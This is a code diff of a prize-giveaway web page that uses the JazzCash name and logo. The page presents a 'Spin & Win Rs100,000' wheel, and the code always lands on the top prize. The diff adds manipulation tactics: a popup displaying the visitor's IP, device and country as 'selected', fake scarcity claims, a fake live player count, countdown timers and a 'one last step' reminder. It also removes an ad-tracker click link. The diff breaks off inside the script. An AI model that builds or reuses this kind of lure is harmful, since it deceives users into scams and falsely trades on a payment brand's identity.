@@ -126,7 +126,6 @@
     .c-reply-btn { font-size: 12px; color: #444; background: none; border: none; cursor: pointer; padding: 0 }
     .c-reply-btn:hover { color: #888 }
 
-    /* Visitor comment box */
     .visitor-comment-box {
       background: #111; border: 1px solid #1e1e1e; border-radius: 14px; padding: 14px;
       margin-bottom: 1.5rem; text-align: left;
@@ -155,87 +154,102 @@
     }
     .visitor-comment-box button:hover { opacity: .9 }
 
-    .modal-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.85); z-index: 200; align-items: center; justify-content: center; padding: 1rem }
+    /* --- MODAL STYLES --- */
+    .modal-backdrop { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(14px); z-index: 200; align-items: center; justify-content: center; padding: 1.5rem }
     .modal-backdrop.open { display: flex }
+    
     .modal {
-      background: #111; border: 1px solid #2a2a2a; border-radius: 20px;
-      padding: 2.25rem 1.75rem 1.75rem; max-width: 370px; width: 100%; text-align: center;
-      animation: popIn .35s cubic-bezier(.34,1.56,.64,1) both;
+      background: transparent; 
+      max-width: 360px; width: 100%; text-align: center;
+      animation: floatIn 0.5s cubic-bezier(0.2, 1.2, 0.3, 1) both;
     }
-    @keyframes popIn { from { transform: scale(.8); opacity: 0 } to { transform: scale(1); opacity: 1 } }
-    .modal-emoji { font-size: 52px; margin-bottom: .5rem; display: block }
-    .modal h2 { font-size: 22px; font-weight: 700; margin-bottom: .5rem; color: #f0ede8 }
-    .prize-tag {
-      display: inline-block; background: #1f1400; color: #f5b942;
-      font-size: 24px; font-weight: 800; border-radius: 10px;
-      padding: 7px 22px; margin-bottom: 1rem; border: 1px solid #3a2c00;
+    @keyframes floatIn { from { transform: scale(0.92) translateY(20px); opacity: 0; } to { transform: scale(1) translateY(0); opacity: 1; } }
+    
+    .popup-logo {
+      display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 10px;
+      width: fit-content; margin-left: auto; margin-right: auto;
     }
-    .modal p { font-size: 14px; color: #777; margin-bottom: 1.25rem; line-height: 1.6 }
-    .modal input {
-      width: 100%; padding: 12px 14px; font-size: 15px;
-      background: #0d0d0d; border: 1.5px solid #2a2a2a; border-radius: 10px;
-      color: #f0ede8; outline: none; margin-bottom: .75rem; transition: border-color .15s;
+    .popup-logo img { width: 46px; height: 46px; object-fit: contain; filter: drop-shadow(0 0 6px #f5b942); }
+    .popup-logo span { font-weight: 900; font-size: 26px; background: linear-gradient(135deg, #FFDE94, #F5B942, #FFA500); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: 1px; }
+    
+    .attention-title {
+      font-size: 28px; font-weight: 900; margin: 8px 0 4px; background: linear-gradient(135deg, #FFF3CD, #F5B942, #FFC107);
+      -webkit-background-clip: text; background-clip: text; color: transparent;
+      letter-spacing: -0.8px;
     }
-    .modal input::placeholder { color: #444 }
-    .modal input:focus { border-color: #f5b942 }
-    .modal-cta {
-      width: 100%; padding: 14px;
-      background: linear-gradient(135deg, #f5b942, #e07b00);
-      color: #0a0a0a; border: none; border-radius: 10px;
-      font-size: 16px; font-weight: 800; cursor: pointer; margin-bottom: .6rem; transition: opacity .15s;
-      text-decoration: none; display: inline-block; text-align: center;
+    .prize-highlight {
+      display: inline-flex; align-items: baseline; gap: 5px; background: rgba(0,0,0,0.45); backdrop-filter: blur(8px);
+      padding: 8px 24px; border-radius: 100px; margin: 12px 0 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
-    .modal-cta:hover { opacity: .9 }
-    .modal-dismiss { font-size: 12px; color: #444; cursor: pointer; background: none; border: none; text-decoration: underline }
+    .prize-highlight .currency { font-size: 28px; font-weight: 800; color: #f5b942; text-shadow: 0 0 5px #ffbb33; }
+    .prize-highlight .amount { font-size: 52px; font-weight: 900; background: linear-gradient(135deg, #FFEEBB, #FFB347); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -2px; }
+    .info-pill {
+      background: rgba(0,0,0,0.55); backdrop-filter: blur(8px); border-radius: 60px; padding: 8px 14px; margin: 8px 0 8px;
+      display: flex; justify-content: center; gap: 20px; font-size: 12px; flex-wrap: wrap;
+    }
+    .info-pill span { display: inline-flex; align-items: center; gap: 5px; color: #f0ede8; font-weight: 500; }
+    .info-pill span strong { color: #f5b942; font-weight: 800; text-shadow: 0 0 3px #f5b942; }
+    .exclusive-badge {
+      background: linear-gradient(115deg, #2e1a6e80, #13062e80); backdrop-filter: blur(8px);
+      color: #FFE484; font-size: 13px; font-weight: bold; padding: 6px 18px; border-radius: 60px; display: inline-block;
+      letter-spacing: 0.5px; margin: 12px 0 6px;
+    }
+    .flash-message {
+      font-size: 14px; font-weight: 800; color: #ffdf99; background: rgba(42,26,0,0.7); backdrop-filter: blur(4px);
+      display: inline-block; padding: 4px 20px; border-radius: 60px; margin: 6px 0 12px;
+      animation: pulseFlash 1s infinite;
+    }
+    @keyframes pulseFlash { 0% { opacity: 0.7; } 50% { opacity: 1; text-shadow: 0 0 6px #ffcc44; } 100% { opacity: 0.7; } }
+    .timer-premium {
+      background: rgba(14,14,18,0.8); backdrop-filter: blur(10px); border-radius: 80px; padding: 6px 22px; display: inline-flex;
+      align-items: center; gap: 12px; margin: 8px 0 18px;
+    }
+    .timer-premium span:first-child { font-size: 14px; color: #f5b942; font-weight: 700; }
+    .timer-premium #entryOfferCountdown { font-size: 26px; font-weight: 900; color: #ff6b6b; background: rgba(0,0,0,0.7); padding: 2px 16px; border-radius: 60px; font-family: monospace; letter-spacing: 3px; }
+    .modal-cta-premium {
+      width: 100%; padding: 14px 16px; background: linear-gradient(115deg, #f5b942, #e07b00, #ffbb44);
+      border: none; border-radius: 80px; font-size: 20px; font-weight: 900; color: #0a0a0a;
+      cursor: pointer; margin: 6px 0 12px; transition: all 0.2s; box-shadow: 0 8px 24px rgba(245,185,66,0.7);
+      display: flex; align-items: center; justify-content: center; gap: 12px;
+    }
+    .modal-cta-premium:hover { transform: scale(1.02); background: linear-gradient(115deg, #FFCC66, #F5A623); }
+    .modal-dismiss-premium {
+      font-size: 13px; color: #ccc; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px);
+      border: none; cursor: pointer; padding: 8px 16px; border-radius: 60px;
+      margin-top: 4px; transition: 0.2s; display: inline-block;
+    }
+    .modal-dismiss-premium:hover { color: #f5b942; background: rgba(0,0,0,0.7); }
 
+    .win-card, .reminder-card {
+      background: rgba(0,0,0,0.65); backdrop-filter: blur(16px); border-radius: 48px; padding: 1.6rem 1.2rem;
+      box-shadow: 0 20px 35px rgba(0,0,0,0.5);
+    }
+    .modal-cta-win, .modal-cta-reminder {
+      background: linear-gradient(125deg, #f5b942, #e07b00, #ffaa33);
+      border: none; border-radius: 60px; padding: 14px 0; font-size: 20px; font-weight: 900;
+      color: #111; width: 100%; cursor: pointer; transition: 0.2s; margin-top: 10px;
+      box-shadow: 0 6px 18px rgba(245,185,66,0.6);
+    }
+    .modal-cta-win:hover, .modal-cta-reminder:hover { transform: scale(1.02); background: linear-gradient(125deg, #ffcf6e, #f5a623); }
+    .prize-counter-wrap { display: flex; align-items: baseline; justify-content: center; gap: 4px; margin: 0.5rem 0 0.8rem; }
+    .prize-currency { font-size: 28px; font-weight: 800; color: #f5b942; }
+    #prize-counter { font-size: 52px; font-weight: 900; background: linear-gradient(135deg, #f5b942, #ff6b6b); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -1px; }
+    .offer-timer { margin-top: 1rem; font-size: 13px; color: #bbb; display: flex; align-items: center; justify-content: center; gap: 6px; }
+    #offer-countdown, #reminder-countdown { font-size: 16px; font-weight: 800; color: #ff8888; background: #2a0a0a; border-radius: 60px; padding: 2px 12px; }
+    
     .confetti-wrap { position: fixed; inset: 0; pointer-events: none; z-index: 199; overflow: hidden }
     .confetti-wrap.hidden { display: none }
     .cf { position: absolute; border-radius: 2px; animation: fall linear forwards }
     @keyframes fall { 0% { transform: translateY(-20px) rotate(0deg); opacity: 1 } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0 } }
-
     .footer { margin-top: 2.5rem; padding-top: 1.25rem; border-top: 1px solid #1a1a1a; text-align: center }
     .footer-sponsored { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 11px; color: #444; margin-bottom: 6px }
     .jazzcash-logo { display: inline-flex; align-items: center; gap: 4px; background: #1a0a00; border: 1px solid #3a1e00; border-radius: 6px; padding: 3px 8px; font-size: 11px; font-weight: 700; color: #f5b942 }
     .footer-disclaimer { font-size: 10px; color: #333; line-height: 1.5; max-width: 380px; margin: 0 auto }
-
-    .prize-counter-wrap {
-      display: flex; align-items: baseline; justify-content: center; gap: 4px;
-      margin: 0.5rem 0 1rem;
-    }
-    .prize-currency {
-      font-size: 28px; font-weight: 800; color: #f5b942;
-      text-shadow: 0 0 20px rgba(245,185,66,.6);
-    }
-    #prize-counter {
-      font-size: 52px; font-weight: 900;
-      background: linear-gradient(135deg, #f5b942, #ff6b6b);
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: -1px;
-      font-variant-numeric: tabular-nums;
-      min-width: 200px; text-align: left;
-    }
-
-    .offer-timer {
-      margin-top: 1rem; font-size: 13px; color: #666;
-      display: flex; align-items: center; justify-content: center; gap: 6px;
-    }
-    #offer-countdown {
-      font-size: 16px; font-weight: 800; color: #ff4444;
-      font-variant-numeric: tabular-nums;
-      background: #1a0000; border: 1px solid #3a0000;
-      border-radius: 6px; padding: 2px 10px;
-      animation: timerPulse 1s ease-in-out infinite;
-    }
-    @keyframes timerPulse { 0%, 100% { opacity: 1 } 50% { opacity: .6 } }
-
-    .jazzcash-badge-popup {
-      display: flex; align-items: center; justify-content: center; gap: 8px;
-      margin-bottom: 0.8rem;
-    }
+    
+    .loading-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #f5b942; margin: 0 2px; animation: pulse 1s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
   </style>
   <link rel="preload" as="audio" href="https://res.cloudinary.com/dbhfjxl73/video/upload/v1779602533/extracted_audio_asuedv.mp3">
- <meta http-equiv="delegate-ch" content="sec-ch-ua https://vtdmp.bemobtrcks.com; sec-ch-ua-mobile https://vtdmp.bemobtrcks.com; sec-ch-ua-arch https://vtdmp.bemobtrcks.com; sec-ch-ua-model https://vtdmp.bemobtrcks.com; sec-ch-ua-platform https://vtdmp.bemobtrcks.com; sec-ch-ua-platform-version https://vtdmp.bemobtrcks.com; sec-ch-ua-bitness https://vtdmp.bemobtrcks.com; sec-ch-ua-full-version-list https://vtdmp.bemobtrcks.com; sec-ch-ua-full-version https://vtdmp.bemobtrcks.com">
 </head>
 <body>
 
@@ -246,432 +260,179 @@
   <h1>Spin & Win.<br><span>Rs100,000 Cash!</span></h1>
   <p class="sub">Every spin is a guaranteed winner. Thousands of Pakistanis are claiming their prize today — why miss out?</p>
 
-  <div class="live-pill">
-    <span class="live-dot"></span>
-    <span id="live-count">3,812 people playing right now</span>
-  </div>
+  <div class="live-pill"><span class="live-dot"></span><span id="live-count">3,812 people playing right now</span></div>
 
   <div class="wheel-outer" id="wheel-outer">
     <div class="pointer"></div>
     <div class="light-ring" id="light-ring"></div>
-    <div class="wheel-wrap">
-      <canvas id="wheel-canvas" width="290" height="290" onclick="startSpin()"></canvas>
-    </div>
+    <div class="wheel-wrap"><canvas id="wheel-canvas" width="290" height="290" onclick="startSpin()"></canvas></div>
   </div>
 
   <button class="spin-btn" id="spin-btn" onclick="startSpin()">🎰 Spin Now!</button>
   <p class="no-purchase">No purchase necessary &nbsp;·&nbsp; Sponsored By <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none'"> JazzCash</p>
 
   <div class="divider">Recent Winners</div>
+  <div class="comments-section-title"><span>💬 What people are saying</span><span class="inline-live"><span class="ldot"></span>Live</span></div>
+  <div class="comments-box"><div id="comments-list"></div></div>
 
-  <div class="comments-section-title">
-    <span>💬 What people are saying</span>
-    <span class="inline-live">
-      <span class="ldot"></span>Live
-    </span>
-  </div>
-
-  <div class="comments-box">
-    <div id="comments-list"></div>
-  </div>
-
-  <!-- Visitor comment box with name field -->
   <div class="visitor-comment-box">
-    <div class="input-row">
-      <input type="text" id="visitorNameInput" placeholder="Your name" maxlength="30">
-    </div>
+    <div class="input-row"><input type="text" id="visitorNameInput" placeholder="Your name" maxlength="30"></div>
     <textarea id="visitorCommentInput" rows="3" placeholder="Write your comment... "></textarea>
     <button onclick="postVisitorComment()">📝 Post Comment</button>
   </div>
 
   <div class="footer">
-    <div class="footer-sponsored">
-      Sponsored by &nbsp;<span class="jazzcash-logo"><img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none'"> JazzCash</span>
-    </div>
-    <p class="footer-disclaimer">
-      * This page is for sample and demonstration purposes only. JazzCash has no affiliation with this giveaway. The JazzCash name is used as an example only — this is not advertising or an endorsement of any kind.
-    </p>
+    <div class="footer-sponsored">Sponsored by &nbsp;<span class="jazzcash-logo"><img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none'"> JazzCash</span></div>
+    <p class="footer-disclaimer">* This page is for sample and demonstration purposes only. JazzCash has no affiliation with this giveaway. The JazzCash name is used as an example only — this is not advertising or an endorsement of any kind.</p>
   </div>
 </div>
 
-<!-- Win Modal -->
+<!-- ENTRY POPUP with DYNAMIC IP & DEVICE -->
+<div class="modal-backdrop" id="entryPopup">
+  <div class="modal">
+    <div class="popup-logo"><img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash"><span>JazzCash</span></div>
+    <div class="attention-title">🎯 YOUR NUMBER IS SELECTED!</div>
+    <div class="prize-highlight"><span class="currency">₨</span><span class="amount">100,000</span></div>
+    <div class="info-pill" id="dynamicInfo">
+      <span>📍 <strong>IP</strong> <span id="visitorIP">--</span></span>
+      <span>💻 <strong>Device</strong> <span id="visitorDevice">Detecting...</span></span>
+      <span>🌍 <strong>Country</strong> <span id="visitorCountry">--</span></span>
+    </div>
+    <div class="exclusive-badge">⭐ YOU ARE 1 OF ONLY 3 SELECTED TODAY ⭐</div>
+    <div class="flash-message">⚡ LIMITED TIME OFFER ⚡</div>
+    <div class="timer-premium"><span>⏱️ Expires in</span><span id="entryOfferCountdown">01:00</span></div>
+    <button id="entryPopupClaimBtn" class="modal-cta-premium">🎁 CONTINUE</button>
+    <button id="closeEntryPopup" class="modal-dismiss-premium">No thanks, maybe later</button>
+  </div>
+</div>
+
+<!-- REMINDER MODAL -->
+<div class="modal-backdrop" id="reminderPopup">
+  <div class="modal">
+    <div class="reminder-card">
+      <div style="display:flex; justify-content:center; gap:8px; margin-bottom:8px;"><img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:42px;height:42px;"><span style="color:#f5b942; font-weight:800; font-size:1.5rem;">JazzCash</span></div>
+      <span style="font-size:48px;">⚠️</span>
+      <h2 style="font-size:26px; margin:8px 0 0; background:linear-gradient(135deg,#FFE6B0,#f5b942); -webkit-background-clip:text; background-clip:text; color:transparent;">One Last Step!</h2>
+      <p style="color:#ddd; margin:12px 0 8px; font-size:16px;">You are just <strong>one simple click</strong> away from securing your reward. Don't miss this exclusive opportunity!</p>
+      <div class="timer-premium" style="margin:10px 0 8px;"><span>⏱️ Remaining</span><span id="reminder-countdown">00:45</span></div>
+      <button id="reminderClaimBtn" class="modal-cta-reminder">✅ OK, CLAIM MY REWARD ✅</button>
+    </div>
+  </div>
+</div>
+
+<!-- WIN MODAL -->
 <div class="modal-backdrop" id="modal">
   <div class="modal">
-    <div class="jazzcash-badge-popup">
-      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:36px;height:36px;object-fit:contain;" onerror="this.style.display='none'">
-      <span style="color:#f5b942; font-weight:800; font-size:1.2rem;">JazzCash</span>
+    <div class="win-card">
+      <div style="display:flex; justify-content:center; gap:8px;"><img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:42px;height:42px;"><span style="color:#f5b942; font-weight:800; font-size:1.5rem;">JazzCash</span></div>
+      <span style="font-size:54px;">🎉</span>
+      <h2 style="font-size:28px; margin:6px 0 0; background:linear-gradient(135deg,#FFE6B0,#f5b942); -webkit-background-clip:text; background-clip:text; color:transparent;">Congratulations!</h2>
+      <p style="color:#ddd; margin:10px 0 6px;">You have won</p>
+      <div class="prize-counter-wrap"><span class="prize-currency">Rs</span><span id="prize-counter">0</span></div>
+      <button id="modal-cta-link" class="modal-cta-win" onclick="handleClaim()">🔥 PROCEED 🔥</button>
+      <div class="offer-timer">⏳ Offer valid for : <span id="offer-countdown">01:00</span></div>
     </div>
-    <span class="modal-emoji">🎉</span>
-    <h2>Congratulations!</h2>
-    <p style="color:#ccc; margin-bottom:0.3rem;">You have won</p>
-    <div class="prize-counter-wrap">
-      <span class="prize-currency">Rs</span>
-      <span id="prize-counter">0</span>
-    </div>
-    <p>Tap the button below to claim your prize now.</p>
-    <button id="modal-cta-link" href="https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0" target="_blank" class="modal-cta" onclick="handleClaim()">PROCEED</button>
-    <div class="offer-timer">Offer valid for : <span id="offer-countdown">01:00</span></div>
   </div>
 </div>
+
 <script>
-  // ── Audio ──
+  // --- Core Wheel & Audio (preserved)
   let audioCtx = null;
-  function getAudioCtx() {
-    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    return audioCtx;
-  }
-  function playClick(vol) {
-    try {
-      const ctx = getAudioCtx();
-      const buf = ctx.createBuffer(1, ctx.sampleRate * 0.015, ctx.sampleRate);
-      const data = buf.getChannelData(0);
-      for (let i = 0; i < data.length; i++) data[i] = (Math.random() * 2 - 1) * Math.pow(1 - i / data.length, 3);
-      const src = ctx.createBufferSource(); src.buffer = buf;
-      const gain = ctx.createGain(); gain.gain.value = vol || 0.35;
-      src.connect(gain); gain.connect(ctx.destination); src.start();
-    } catch(e) {}
-  }
-
-  // ── Wheel ──
-  const SEGMENTS = [
-    {label:'Rs 500',   color:'#1a3a00', prize:false},
-    {label:'Try Again',color:'#1a1a1a', prize:false},
-    {label:'Rs 1,000', color:'#1f1400', prize:false},
-    {label:'Rs 200',   color:'#001a2a', prize:false},
-    {label:'Rs100,000',color:'#2a0000', prize:true},
-    {label:'Rs 5,000', color:'#1a0030', prize:false},
-    {label:'Rs 300',   color:'#001a10', prize:false},
-    {label:'Rs 2,500', color:'#1f1400', prize:false},
-  ];
+  function getAudioCtx() { if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)(); return audioCtx; }
+  function playClick(vol) { try { const ctx = getAudioCtx(); const buf = ctx.createBuffer(1, ctx.sampleRate * 0.015, ctx.sampleRate); const data = buf.getChannelData(0); for (let i = 0; i < data.length; i++) data[i] = (Math.random() * 2 - 1) * Math.pow(1 - i / data.length, 3); const src = ctx.createBufferSource(); src.buffer = buf; const gain = ctx.createGain(); gain.gain.value = vol || 0.35; src.connect(gain); gain.connect(ctx.destination); src.start(); } catch(e) {} }
+  
+  const SEGMENTS = [{label:'Rs 500',color:'#1a3a00',prize:false},{label:'Try Again',color:'#1a1a1a',prize:false},{label:'Rs 1,000',color:'#1f1400',prize:false},{label:'Rs 200',color:'#001a2a',prize:false},{label:'Rs100,000',color:'#2a0000',prize:true},{label:'Rs 5,000',color:'#1a0030',prize:false},{label:'Rs 300',color:'#001a10',prize:false},{label:'Rs 2,500',color:'#1f1400',prize:false}];
   const COLORS_TEXT = ['#7ed321','#555','#f5b942','#42b8f5','#ff6b6b','#c084fc','#34d399','#fbbf24'];
-  const canvas = document.getElementById('wheel-canvas');
-  const ctx2 = canvas.getContext('2d');
-  const N = SEGMENTS.length, ARC = (2*Math.PI)/N;
-  let currentAngle = 0, spinning = false;
-
-  function drawWheel(angle){
-    const cx = canvas.width/2, cy = canvas.height/2, r = cx-4;
-    ctx2.clearRect(0,0,canvas.width,canvas.height);
-    SEGMENTS.forEach((seg,i) => {
-      const start = angle + i*ARC, end = start+ARC;
-      ctx2.beginPath(); ctx2.moveTo(cx,cy); ctx2.arc(cx,cy,r,start,end); ctx2.closePath();
-      const grad = ctx2.createRadialGradient(cx,cy,r*0.25,cx,cy,r);
-      grad.addColorStop(0, lighten(seg.color,30)); grad.addColorStop(1, seg.color);
-      ctx2.fillStyle = grad; ctx2.fill();
-      ctx2.strokeStyle = 'rgba(255,255,255,0.07)'; ctx2.lineWidth = 1.5; ctx2.stroke();
-      ctx2.save(); ctx2.translate(cx,cy); ctx2.rotate(start+ARC/2);
-      ctx2.textAlign = 'right'; ctx2.fillStyle = COLORS_TEXT[i];
-      const fs = seg.label.length>7 ? 11:13;
-      ctx2.font = `bold ${fs}px -apple-system,sans-serif`;
-      ctx2.shadowColor = COLORS_TEXT[i]; ctx2.shadowBlur = 6;
-      ctx2.fillText(seg.label, r-10, 5);
-      ctx2.restore();
-    });
-    ctx2.beginPath(); ctx2.arc(cx,cy,r,0,2*Math.PI);
-    ctx2.strokeStyle = '#f5b942'; ctx2.lineWidth = 3; ctx2.stroke();
-    const hubGrad = ctx2.createRadialGradient(cx-4,cy-4,2,cx,cy,22);
-    hubGrad.addColorStop(0,'#2a2a2a'); hubGrad.addColorStop(1,'#0d0d0d');
-    ctx2.beginPath(); ctx2.arc(cx,cy,22,0,2*Math.PI);
-    ctx2.fillStyle = hubGrad; ctx2.fill();
-    ctx2.strokeStyle = '#f5b942'; ctx2.lineWidth = 2.5; ctx2.stroke();
-    ctx2.fillStyle = '#f5b942'; ctx2.font = 'bold 14px sans-serif';
-    ctx2.textAlign = 'center'; ctx2.shadowColor = '#f5b942'; ctx2.shadowBlur = 8;
-    ctx2.fillText('🎰',cx,cy+5); ctx2.shadowBlur = 0;
-  }
-
-  function lighten(hex,amt){
-    let n = parseInt(hex.replace('#',''),16);
-    let r = Math.min(255,(n>>16)+amt), g = Math.min(255,((n>>8)&0xff)+amt), b = Math.min(255,(n&0xff)+amt);
-    return '#'+[r,g,b].map(v=>v.toString(16).padStart(2,'0')).join('');
-  }
+  const canvas = document.getElementById('wheel-canvas'); const ctx2 = canvas.getContext('2d'); const N = SEGMENTS.length, ARC = (2*Math.PI)/N; let currentAngle = 0, spinning = false;
+  function drawWheel(angle){ const cx = canvas.width/2, cy = canvas.height/2, r = cx-4; ctx2.clearRect(0,0,canvas.width,canvas.height); SEGMENTS.forEach((seg,i) => { const start = angle + i*ARC, end = start+ARC; ctx2.beginPath(); ctx2.moveTo(cx,cy); ctx2.arc(cx,cy,r,start,end); ctx2.closePath(); const grad = ctx2.createRadialGradient(cx,cy,r*0.25,cx,cy,r); grad.addColorStop(0, lighten(seg.color,30)); grad.addColorStop(1, seg.color); ctx2.fillStyle = grad; ctx2.fill(); ctx2.strokeStyle = 'rgba(255,255,255,0.07)'; ctx2.lineWidth = 1.5; ctx2.stroke(); ctx2.save(); ctx2.translate(cx,cy); ctx2.rotate(start+ARC/2); ctx2.textAlign = 'right'; ctx2.fillStyle = COLORS_TEXT[i]; const fs = seg.label.length>7 ? 11:13; ctx2.font = `bold ${fs}px -apple-system,sans-serif`; ctx2.shadowColor = COLORS_TEXT[i]; ctx2.shadowBlur = 6; ctx2.fillText(seg.label, r-10, 5); ctx2.restore(); }); ctx2.beginPath(); ctx2.arc(cx,cy,r,0,2*Math.PI); ctx2.strokeStyle = '#f5b942'; ctx2.lineWidth = 3; ctx2.stroke(); const hubGrad = ctx2.createRadialGradient(cx-4,cy-4,2,cx,cy,22); hubGrad.addColorStop(0,'#2a2a2a'); hubGrad.addColorStop(1,'#0d0d0d'); ctx2.beginPath(); ctx2.arc(cx,cy,22,0,2*Math.PI); ctx2.fillStyle = hubGrad; ctx2.fill(); ctx2.strokeStyle = '#f5b942'; ctx2.lineWidth = 2.5; ctx2.stroke(); ctx2.fillStyle = '#f5b942'; ctx2.font = 'bold 14px sans-serif'; ctx2.textAlign = 'center'; ctx2.shadowColor = '#f5b942'; ctx2.shadowBlur = 8; ctx2.fillText('🎰',cx,cy+5); ctx2.shadowBlur = 0; }
+  function lighten(hex,amt){ let n = parseInt(hex.replace('#',''),16); let r = Math.min(255,(n>>16)+amt), g = Math.min(255,((n>>8)&0xff)+amt), b = Math.min(255,(n&0xff)+amt); return '#'+[r,g,b].map(v=>v.toString(16).padStart(2,'0')).join(''); }
   drawWheel(0);
-
-  function buildLightRing(){
-    const ring = document.getElementById('light-ring'); ring.innerHTML = '';
-    for(let i=0;i<24;i++){
-      const dot = document.createElement('div'); dot.className = 'light-dot';
-      const a = (i/24)*2*Math.PI - Math.PI/2;
-      dot.style.left = (160+155*Math.cos(a)-5)+'px';
-      dot.style.top = (160+155*Math.sin(a)-5)+'px';
-      dot.style.animationDelay = (i*0.025)+'s';
-      ring.appendChild(dot);
-    }
-  }
+  function buildLightRing(){ const ring = document.getElementById('light-ring'); ring.innerHTML = ''; for(let i=0;i<24;i++){ const dot = document.createElement('div'); dot.className = 'light-dot'; const a = (i/24)*2*Math.PI - Math.PI/2; dot.style.left = (160+155*Math.cos(a)-5)+'px'; dot.style.top = (160+155*Math.sin(a)-5)+'px'; dot.style.animationDelay = (i*0.025)+'s'; ring.appendChild(dot); } }
   buildLightRing();
 
-  function startSpin(){
-    if(spinning) return;
-    spinning = true;
-    document.getElementById('spin-btn').disabled = true;
-    const targetIdx = 4;
-    const fullSpins = 6 + Math.floor(Math.random()*3);
-    const targetAngle = -(targetIdx*ARC + ARC/2) + (Math.PI*3/2);
-    const totalRotation = fullSpins*2*Math.PI + ((targetAngle - currentAngle) % (2*Math.PI));
-    const duration = 4500 + Math.random()*800;
-    const start = performance.now(), startA = currentAngle;
-    let lastSeg = -1;
-    function easeOut(t){ return 1 - Math.pow(1-t,4) }
-    function frame(now){
-      const elapsed = now - start, t = Math.min(elapsed/duration, 1);
-      const angle = startA + totalRotation * easeOut(t);
-      currentAngle = angle; drawWheel(angle);
-      const seg = Math.floor(((-angle % (2*Math.PI) + 2*Math.PI) / ARC)) % N;
-      if(seg !== lastSeg){ playClick(0.2+0.15*(1-t)); lastSeg = seg; }
-      if(t < 1){ requestAnimationFrame(frame); }
-      else {
-        spinning = false; spawnConfetti();
-        setTimeout(() => {
-          document.getElementById('modal').classList.add('open');
-          startPrizeCounter();
-          startOfferCountdown();
-        }, 600);
-      }
+  function startSpin(){ if(spinning) return; spinning = true; document.getElementById('spin-btn').disabled = true; const targetIdx = 4; const fullSpins = 6 + Math.floor(Math.random()*3); const targetAngle = -(targetIdx*ARC + ARC/2) + (Math.PI*3/2); const totalRotation = fullSpins*2*Math.PI + ((targetAngle - currentAngle) % (2*Math.PI)); const duration = 4500 + Math.random()*800; const start = performance.now(), startA = currentAngle; let lastSeg = -1; function easeOut(t){ return 1 - Math.pow(1-t,4); } function frame(now){ const elapsed = now - start, t = Math.min(elapsed/duration, 1); const angle = startA + totalRotation * easeOut(t); currentAngle = angle; drawWheel(angle); const seg = Math.floor(((-angle % (2*Math.PI) + 2*Math.PI) / ARC)) % N; if(seg !== lastSeg){ playClick(0.2+0.15*(1-t)); lastSeg = seg; } if(t < 1){ requestAnimationFrame(frame); } else { spinning = false; spawnConfetti(); setTimeout(() => { document.getElementById('modal').classList.add('open'); startPrizeCounter(); startOfferCountdown(); }, 600); } } requestAnimationFrame(frame); }
+  function spawnConfetti(){ const wrap = document.getElementById('confetti'); wrap.classList.remove('hidden'); wrap.innerHTML = ''; const colors = ['#f5b942','#ff6b6b','#7ed321','#42b8f5','#c084fc','#fbbf24','#34d399']; for(let i=0;i<90;i++){ const el = document.createElement('div'); el.className = 'cf'; el.style.cssText = `left:${Math.random()*100}%;width:${6+Math.random()*8}px;height:${6+Math.random()*8}px;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${2+Math.random()*2}s;animation-delay:${Math.random()*0.6}s;`; wrap.appendChild(el); } setTimeout(()=> wrap.classList.add('hidden'), 4500); }
+  function playWinFanfare(){ try{ const ctx = getAudioCtx(); const now = ctx.currentTime; const notes = [523,659,784,1047,1319]; notes.forEach((freq,i) => { const osc = ctx.createOscillator(); const g = ctx.createGain(); osc.type = 'triangle'; osc.frequency.value = freq; const t = now + i*0.08; g.gain.setValueAtTime(0, t); g.gain.linearRampToValueAtTime(0.3, t+0.03); g.gain.exponentialRampToValueAtTime(0.001, t+0.45); osc.connect(g); g.connect(ctx.destination); osc.start(t); osc.stop(t+0.5); }); } catch(e) {} }
+  let squidAudio = null; function _loadSquid(cb){ if(squidAudio){ cb(squidAudio); return; } squidAudio = new Audio("https://res.cloudinary.com/dbhfjxl73/video/upload/v1779602533/extracted_audio_asuedv.mp3"); squidAudio.preload = "auto"; squidAudio.addEventListener("canplaythrough", () => { cb(squidAudio); }); } function _playSquid(offsetSecs, durationSecs){ _loadSquid(audio => { try{ audio.currentTime = offsetSecs; audio.play().catch(()=>{}); setTimeout(() => { audio.pause(); }, durationSecs * 1000); }catch(e){} }); } function _stopSquid(){ if(squidAudio){ squidAudio.pause(); squidAudio.currentTime = 0; } } document.addEventListener('click', function pre(){ _loadSquid(()=>{}); }, {once:true});
